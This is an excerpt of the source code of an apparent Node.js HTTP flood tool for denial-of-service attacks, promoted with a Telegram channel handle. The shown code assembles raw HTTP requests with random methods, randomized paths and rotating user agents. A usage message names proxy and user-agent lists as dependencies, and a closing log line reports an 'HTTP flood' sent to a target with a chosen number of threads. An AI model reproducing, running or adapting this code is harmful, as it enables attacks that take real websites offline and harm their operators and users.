...
------------------------------------------------------------------
Dependencies: ua.txt (User Agents) | proxies.txt (Proxies)
`);
    process.exit(0);
}
...
if (path.indexOf("[rand]") !== -1){
    path = path.replace(/\[rand\]/g,RandomString(getRandomNumberBetween(5,18)));
}
const randomMethods = Methods[Math.floor(Math.random() * Methods.length)];
var raw_socket = randomMethods + ' ' + path + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nConnection: keep-alive: ' + VarsDefinetions.Objetive + '\r\nAccept-Encoding: gzip, deflate, br\r\nAccept: */*\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nAccept-Language: en-US,en;q=0.9\r\nReferer: ' + VarsDefinetions.Objetive + '\r\nCache-Control: no-store0\r\n\r\n'
return raw_socket;
}
...
setTimeout(() => {
    console.log('\nt.me/cecilionetwork HTTP flood sent for ' + process.argv[3] + ' seconds with ' + process.argv[4] + ' threads! Target: ' + process.argv[2] + '\n')
  process.exit(1);
